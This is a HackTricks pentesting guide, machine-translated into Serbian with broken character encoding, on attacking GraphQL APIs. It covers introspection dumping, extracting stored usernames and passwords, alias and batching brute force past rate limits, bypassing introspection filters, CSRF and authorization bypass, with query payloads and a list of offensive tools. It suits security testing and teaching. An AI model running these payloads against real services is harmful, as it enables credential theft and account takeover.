# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

GraphQL je **istaknut** kao **efikasna alternativa** REST API-ju, nude캖i pojednostavljen pristup za upit podataka sa backend-a. U pore캠enju sa REST-om, koji 캜esto zahteva brojne zahteve preko razli캜itih krajnjih ta캜aka za prikupljanje podataka, GraphQL omogu캖ava preuzimanje svih potrebnih informacija putem **jednog zahteva**. Ova pojednostavljenja zna캜ajno **poma쬿 programerima** smanjuju캖i slo쬰nost njihovih procesa preuzimanja podataka.

## GraphQL i bezbednost

Sa pojavom novih tehnologija, uklju캜uju캖i GraphQL, pojavljuju se i nove bezbednosne ranjivosti. Klju캜na ta캜ka koju treba napomenuti je da **GraphQL po defaultu ne uklju캜uje mehanizme autentifikacije**. Odgovornost je programera da implementiraju takve bezbednosne mere. Bez odgovaraju캖e autentifikacije, GraphQL krajnje ta캜ke mogu izlo쬴ti osetljive informacije neautentifikovanim korisnicima, 코to predstavlja zna캜ajan bezbednosni rizik.

### Napadi brute force na direktorijume i GraphQL

Da bi se identifikovale izlo쬰ne GraphQL instance, preporu캜uje se uklju캜ivanje specifi캜nih putanja u napade brute force na direktorijume. Ove putanje su:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identifikacija otvorenih GraphQL instanci omogu캖ava ispitivanje podr쬬nih upita. Ovo je klju캜no za razumevanje podataka dostupnih putem krajnje ta캜ke. GraphQL-ov introspekcioni sistem olak코ava ovo detaljno prikazuju캖i upite koje 코ema podr쬬va. Za vi코e informacija o tome, pogledajte GraphQL dokumentaciju o introspekciji: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Otisak

Alat [**graphw00f**](https://github.com/dolevf/graphw00f) je sposoban da detektuje koji GraphQL engine se koristi na serveru i zatim ispisuje neke korisne informacije za bezbednosnog revizora.

#### Univerzalni upiti <a href="#universal-queries" id="universal-queries"></a>

Da bi se proverilo da li je URL GraphQL servis, mo쬰 se poslati **univerzalni upit**, `query{__typename}`. Ako odgovor uklju캜uje `{"data": {"__typename": "Query"}}`, to potvr캠uje da URL hostuje GraphQL krajnju ta캜ku. Ova metoda se oslanja na GraphQL-ovo polje `__typename`, koje otkriva tip upitnog objekta.
```javascript
query{__typename}
```
### Osnovna Enumeracija

Graphql obi캜no podr쬬va **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Iako se iz bezbednosnih razloga preporu캜uje da se dozvoli samo json kako bi se spre캜ili CSRF napadi.

#### Introspekcija

Da biste koristili introspekciju za otkrivanje informacija o 코emi, upitite polje `__schema`. Ovo polje je dostupno na korenskom tipu svih upita.
```bash
query={__schema{types{name,fields{name}}}}
```
Sa ovom upitom 캖ete prona캖i imena svih tipova koji se koriste:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Sa ovom upitom mo쬰te izvu캖i sve tipove, njihova polja i njihove argumente (i tip argumenata). Ovo 캖e biti veoma korisno za razumevanje kako da upitujete bazu podataka.

![](<../../.gitbook/assets/image (950).png>)

**Gre코ke**

Zanimljivo je znati da li 캖e se **gre코ke** prikazivati jer 캖e doprineti korisnim **informacijama.**
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Enumerisanje 코eme baze podataka putem introspekcije**

{% hint style="info" %}
Ako je introspekcija omogu캖ena, ali gornji upit ne radi, poku코ajte da uklonite `onOperation`, `onFragment` i `onField` direktive iz strukture upita.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Inline introspection query:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Poslednja linija koda je graphql upit koji 캖e izbaciti sve meta-informacije iz graphql (imena objekata, parametre, tipove...)

![](<../../.gitbook/assets/image (363).png>)

Ako je introspekcija omogu캖ena, mo쬰te koristiti [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) da u GUI-u vidite sve opcije.

### Upit

Sada kada znamo koje vrste informacija su sa캜uvane unutar baze podataka, hajde da poku코amo da **izvu캜emo neke vrednosti**.

U introspekciji mo쬰te prona캖i **koji objekat mo쬰te direktno upititi** (jer ne mo쬰te upititi objekat samo zato 코to postoji). Na slede캖oj slici mo쬰te videti da se "_queryType_" zove "_Query_" i da je jedno od polja objekta "_Query_" "_flags_", koji je tako캠e tip objekta. Stoga mo쬰te upititi objekat zastavice.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Napomena: tip upita "_flags_" je "_Flags_", a ovaj objekat je definisan kao ispod:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Mo쬰te videti da se objekti "_Flags_" sastoje od **name** i **value**. Zatim mo쬰te dobiti sve nazive i vrednosti zastavica sa upitom:
```javascript
query={flags{name, value}}
```
Napomena da u slu캜aju da je **objekat za upit** **primitivna** **vrsta** kao 코to je **string** kao u slede캖em primeru

![](<../../.gitbook/assets/image (958).png>)

Mo쬰te ga jednostavno upititi sa:
```javascript
query={hiddenFlags}
```
U drugom primeru gde su bila 2 objekta unutar objekta tipa "_Query_": "_user_" i "_users_".\
Ako ovim objektima nisu potrebni argumenti za pretragu, mogli bismo **izvu캖i sve informacije iz njih** jednostavno **tra쬰캖i** podatke koje 쬰limo. U ovom primeru sa Interneta mogli bismo izvu캖i sa캜uvana korisni캜ka imena i lozinke:

![](<../../.gitbook/assets/image (880).png>)

Me캠utim, u ovom primeru, ako poku코ate to da uradite, dobijate ovu **gre코ku**:

![](<../../.gitbook/assets/image (1042).png>)

Izgleda da 캖e nekako pretra쬴vati koriste캖i argument "_**uid**_" tipa _**Int**_.\
U svakom slu캜aju, ve캖 smo znali da je u sekciji [Basic Enumeration](graphql.md#basic-enumeration) predlo쬰n upit koji nam je pokazivao sve potrebne informacije: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Ako pro캜itate sliku koju sam prilo쬴o kada sam pokrenuo taj upit, vide캖ete da je "_**user**_" imao **arg** "_**uid**_" tipa _Int_.

Dakle, obavljaju캖i malo _**uid**_ bruteforce-a, otkrio sam da je za _**uid**=**1**_ izvu캜eno korisni캜ko ime i lozinka:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Napomena da sam **otkrio** da mogu da tra쬴m **parametre** "_**user**_" i "_**password**_" jer ako poku코am da tra쬴m ne코to 코to ne postoji (`query={user(uid:1){noExists}}`) dobijam ovu gre코ku:

![](<../../.gitbook/assets/image (707).png>)

I tokom **faze enumeracije** otkrio sam da objekat "_**dbuser**_" ima kao polja "_**user**_" i "_**password**_.

**Trik sa dump-ovanjem upitnog stringa (zahvaljuju캖i @BinaryShadow\_)**

Ako mo쬰te da pretra쬿jete po string tipu, kao: `query={theusers(description: ""){username,password}}` i **tra쬴te prazan string**, to 캖e **dump-ovati sve podatke**. (_Napomena: ovaj primer nije povezan sa primerom iz tutorijala, za ovaj primer pretpostavite da mo쬰te da pretra쬿jete koriste캖i "**theusers**" po string polju nazvanom "**description**"_).

### Pretraga

U ovoj postavci, **baza podataka** sadr쬴 **osobe** i **filmove**. **Osobe** su identifikovane po svom **emailu** i **imenu**; **filmovi** po svom **imenu** i **oceni**. **Osobe** mogu biti prijatelji jedni s drugima i tako캠e imati filmove, 코to ukazuje na odnose unutar baze podataka.

Mo쬰te **pretra쬴vati** osobe **po** **imenu** i dobiti njihove email adrese:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Mo쬰te **pretra쬴vati** osobe **po** **imenu** i dobiti njihove **pretpla캖ene** **filmove**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Napomena kako je nazna캜eno da se preuzme `name` od `subscribedMovies` osobe.

Tako캠e mo쬰te **pretra쬴vati vi코e objekata u isto vreme**. U ovom slu캜aju, pretra쬿ju se 2 filma:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ili 캜ak **odnosi nekoliko razli캜itih objekata koriste캖i alias-e**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacije

**Mutacije se koriste za pravljenje promena na serverskoj strani.**

U **introspekciji** mo쬰te prona캖i **deklarisane** **mutacije**. Na slede캖em slici "_MutationType_" se zove "_Mutation_" i objekat "_Mutation_" sadr쬴 imena mutacija (kao 코to je "_addPerson_" u ovom slu캜aju):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

U ovoj postavci, **baza podataka** sadr쬴 **osobe** i **filmove**. **Osobe** se identifikuju po svom **emailu** i **imenu**; **filmovi** po svom **imenu** i **oceni**. **Osobe** mogu biti prijatelji jedni s drugima i tako캠e imati filmove, 코to ukazuje na odnose unutar baze podataka.

Mutacija za **kreiranje novih** filmova unutar baze podataka mo쬰 izgledati kao slede캖a (u ovom primeru mutacija se zove `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Napomena kako su i vrednosti i tip podataka nazna캜eni u upitu.**

Pored toga, baza podataka podr쬬va **mutation** operaciju, nazvanu `addPerson`, koja omogu캖ava kreiranje **persons** zajedno sa njihovim asocijacijama na postoje캖e **friends** i **movies**. Klju캜no je napomenuti da prijatelji i filmovi moraju prethodno postojati u bazi podataka pre nego 코to ih pove쬰te sa novokreiranim osobom.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Direktiva Preoptere캖enja

Kao 코to je obja코njeno u [**jednoj od ranjivosti opisanim u ovom izve코taju**](https://www.landh.tech/blog/20240304-google-hack-50000/), direktiva preoptere캖enja podrazumeva pozivanje direktive 캜ak i milion puta kako bi se server naterao da tro코i operacije dok ne postane mogu캖e izvr코iti DoS napad.

### Grupisanje brute-force u 1 API zahtevu

Ove informacije su preuzete sa [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentifikacija putem GraphQL API sa **istovremenim slanjem mnogih upita sa razli캜itim akreditivima** da bi se proverilo. To je klasi캜an brute force napad, ali sada je mogu캖e poslati vi코e od jednog para korisni캜kog imena/lozinke po HTTP zahtevu zbog GraphQL grupisanja. Ovaj pristup bi prevario spoljne aplikacije za pra캖enje brzine misle캖i da je sve u redu i da ne postoji bot za brute-forcing koji poku코ava da pogodi lozinke.

Ispod mo쬰te prona캖i najjednostavniju demonstraciju zahteva za autentifikaciju aplikacije, sa **3 razli캜ita para email/lozinka u isto vreme**. O캜igledno je mogu캖e poslati hiljade u jednom zahtevu na isti na캜in:

![](<../../.gitbook/assets/image (1081).png>)

Kao 코to mo쬰mo videti iz snimka odgovora, prvi i tre캖i zahtevi su vratili _null_ i reflektovali odgovaraju캖e informacije u _error_ sekciji. **Druga mutacija je imala ispravne** podatke za autentifikaciju i odgovor ima ispravan token sesije za autentifikaciju.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Bez Introspekcije

Sve vi코e **graphql krajnjih ta캜aka onemogu캖ava introspekciju**. Me캠utim, gre코ke koje graphql baca kada se primi neo캜ekivani zahtev su dovoljne za alate poput [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) da rekreiraju ve캖inu 코eme.

맚avi코e, Burp Suite ekstenzija [**GraphQuail**](https://github.com/forcesunseen/graphquail) **posmatra GraphQL API zahteve koji prolaze kroz Burp** i **gradi** internu GraphQL **코emu** sa svakim novim upitom koji vidi. Tako캠e mo쬰 izlo쬴ti 코emu za GraphiQL i Voyager. Ekstenzija vra캖a la쬹i odgovor kada primi upit za introspekciju. Kao rezultat, GraphQuail prikazuje sve upite, argumente i polja dostupna za kori코캖enje unutar API-ja. Za vi코e informacija [**proverite ovo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Lepa **lista re캜i** za otkrivanje [**GraphQL entiteta mo쬰 se prona캖i ovde**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Zaobila쬰nje GraphQL introspekcijskih odbrana <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Da bi se zaobi코le restrikcije na upite za introspekciju u API-jima, umetanje **posebnog karaktera nakon `__schema` klju캜ne re캜i** se pokazuje kao efikasno. Ova metoda koristi uobi캜ajene propuste programera u regex obrascima koji imaju za cilj da blokiraju introspekciju fokusiraju캖i se na `__schema` klju캜nu re캜. Dodavanjem karaktera kao 코to su **razmaci, novi redovi i zarezi**, koje GraphQL ignori코e, ali mo쬯a nisu uzeti u obzir u regex-u, restrikcije se mogu zaobi캖i. Na primer, upit za introspekciju sa novim redom nakon `__schema` mo쬰 zaobi캖i takve odbrane:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Ako ne uspe, razmotrite alternativne metode zahteva, kao 코to su **GET zahtevi** ili **POST sa `x-www-form-urlencoded`**, po코to se ograni캜enja mogu primenjivati samo na POST zahteve.

### Poku코ajte sa WebSockets

Kao 코to je pomenuto u [**ovom predavanju**](https://www.youtube.com/watch?v=tIo\_t5uUK50), proverite da li bi moglo biti mogu캖e povezati se sa graphQL putem WebSockets, jer bi to moglo omogu캖iti da zaobi캠ete potencijalni WAF i da komunikacija putem websocket-a otkrije 코emu graphQL-a:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Otkri캖e Izlo쬰nih GraphQL Struktura**

Kada je introspekcija onemogu캖ena, ispitivanje izvornog koda veb sajta za unapred u캜itane upite u JavaScript bibliotekama je korisna strategija. Ovi upiti se mogu prona캖i koriste캖i `Sources` karticu u alatima za razvoj, pru쬬ju캖i uvide u 코emu API-ja i otkrivaju캖i potencijalno **izlo쬰ne osetljive upite**. Komande za pretragu unutar alata za razvoj su:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF u GraphQL

Ako ne znate 코ta je CSRF, pro캜itajte slede캖u stranicu:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Napolju 캖ete mo캖i da prona캠ete nekoliko GraphQL krajnjih ta캜aka **konfiguranih bez CSRF tokena.**

Imajte na umu da se GraphQL zahtevi obi캜no 코alju putem POST zahteva koriste캖i Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Me캠utim, ve캖ina GraphQL krajnjih ta캜aka tako캠e podr쬬va **`form-urlencoded` POST zahteve:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Zato, po코to se CSRF zahtevi poput prethodnih 코alju **bez preflight zahteva**, mogu캖e je **izvr코iti** **promene** u GraphQL zloupotrebom CSRF.

Me캠utim, imajte na umu da je nova podrazumevana vrednost kola캜i캖a za `samesite` oznaku u Chrome-u `Lax`. To zna캜i da 캖e kola캜i캖 biti poslat samo sa tre캖e strane u GET zahtevima.

Imajte na umu da je obi캜no mogu캖e poslati **query** **zahtev** tako캠e kao **GET** **zahtev i CSRF token mo쬯a ne캖e biti validiran u GET zahtevu.**

Tako캠e, zloupotrebom [**XS-Search**](../../pentesting-web/xs-search/) **napada** mo쬰 biti mogu캖e exfiltrirati sadr쬬j sa GraphQL krajnje ta캜ke zloupotrebom kredencijala korisnika.

Za vi코e informacija **proverite** [**originalni post ovde**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Preuzimanje WebSocket-a izme캠u sajtova u GraphQL

Sli캜no CRSF ranjivostima koje zloupotrebljavaju GraphQL, tako캠e je mogu캖e izvr코iti **preuzimanje WebSocket-a izme캠u sajtova kako bi se zloupotrebila autentifikacija sa GraphQL sa neza코ti캖enim kola캜i캖ima** i naterati korisnika da izvr코i neo캜ekivane radnje u GraphQL.

Za vi코e informacija proverite:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Autorizacija u GraphQL

Mnoge GraphQL funkcije definisane na krajnjoj ta캜ki mogu samo proveravati autentifikaciju zahteva캜a, ali ne i autorizaciju.

Modifikovanje ulaznih varijabli upita mo쬰 dovesti do osetljivih podataka o ra캜unu [leak](https://hackerone.com/reports/792927).

Mutacija mo쬰 캜ak dovesti do preuzimanja ra캜una poku코avaju캖i da modifikuje podatke o drugom ra캜unu.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass autorizacije u GraphQL

[Spajanje upita](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) mo쬰 zaobi캖i slab sistem autentifikacije.

U donjem primeru mo쬰te videti da je operacija "forgotPassword" i da bi trebala da izvr코i samo forgotPassword upit povezan sa njom. Ovo se mo쬰 zaobi캖i dodavanjem upita na kraj, u ovom slu캜aju dodajemo "register" i promenljivu korisnika kako bi se sistem registrovao kao novi korisnik.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Zaobila쬰nje ograni캜enja brzine kori코캖enjem aliasa u GraphQL

U GraphQL-u, aliasi su mo캖na funkcija koja omogu캖ava **izri캜ito imenovanje svojstava** prilikom slanja API zahteva. Ova sposobnost je posebno korisna za preuzimanje **vi코e instanci istog tipa** objekta unutar jednog zahteva. Aliasi se mogu koristiti za prevazila쬰nje ograni캜enja koja spre캜avaju GraphQL objekte da imaju vi코e svojstava sa istim imenom.

Za detaljno razumevanje GraphQL aliasa, preporu캜uje se slede캖i resurs: [Aliasi](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Dok je primarna svrha aliasa smanjenje potrebe za brojnim API pozivima, identifikovan je nenamerni slu캜aj upotrebe gde se aliasi mogu iskoristiti za izvo캠enje brute force napada na GraphQL endpoint. Ovo je mogu캖e jer su neki endpointi za코ti캖eni ograni캜iva캜ima brzine dizajniranim da spre캜e brute force napade ograni캜avanjem **broja HTTP zahteva**. Me캠utim, ovi ograni캜iva캜i brzine mo쬯a ne uzimaju u obzir broj operacija unutar svakog zahteva. S obzirom na to da aliasi omogu캖avaju uklju캜ivanje vi코e upita u jedan HTTP zahtev, mogu zaobi캖i takve mere ograni캜enja brzine.

Razmotrite primer dat ispod, koji ilustruje kako se upiti sa aliasima mogu koristiti za verifikaciju validnosti kodova za popust u prodavnici. Ova metoda bi mogla zaobi캖i ograni캜enje brzine jer kompilira nekoliko upita u jedan HTTP zahtev, potencijalno omogu캖avaju캖i verifikaciju brojnih kodova za popust istovremeno.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Alati

### Skeneri ranjivosti

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testira uobi캜ajene pogre코ne konfiguracije graphql krajnjih ta캜aka
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Skripta za bezbednosno audiranje GraphQL-a sa fokusom na izvo캠enje serijskih GraphQL upita i mutacija.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Prepoznaje kori코캖eni graphql
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Alat koji se mo쬰 koristiti za preuzimanje 코ema i pretragu osetljivih podataka, testiranje autorizacije, brute force 코ema i pronala쬰nje puteva do datog tipa.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Mo쬰 se koristiti kao samostalni alat ili [Burp ekstenzija](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Mo쬰 se koristiti kao CLI klijent tako캠e za automatizaciju napada
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Alat koji navodi razli캜ite na캜ine **dostizanja datog tipa u GraphQL 코emi**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Naslednik samostalnog i CLI moda InQL-a
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp ekstenzija za napredno testiranje GraphQL-a. _**Skener**_ je sr InQL v5.0, gde mo쬰te analizirati GraphQL krajnju ta캜ku ili lokalnu introspekcijsku 코emu. Automatski generi코e sve mogu캖e upite i mutacije, organizuju캖i ih u strukturirani prikaz za va코u analizu. _**Napada캜**_ komponenta vam omogu캖ava da izvr코ite serijske GraphQL napade, 코to mo쬰 biti korisno za zaobila쬰nje lo코e implementiranih ograni캜enja brzine.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Poku코ajte da dobijete 코emu 캜ak i kada je introspekcija onemogu캖ena koriste캖i pomo캖 nekih Graphql baza podataka koje 캖e sugerisati imena mutacija i parametara.

### Klijenti

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI klijent
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Klijent

### Automatski testovi

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video koji obja코njava AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Reference

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
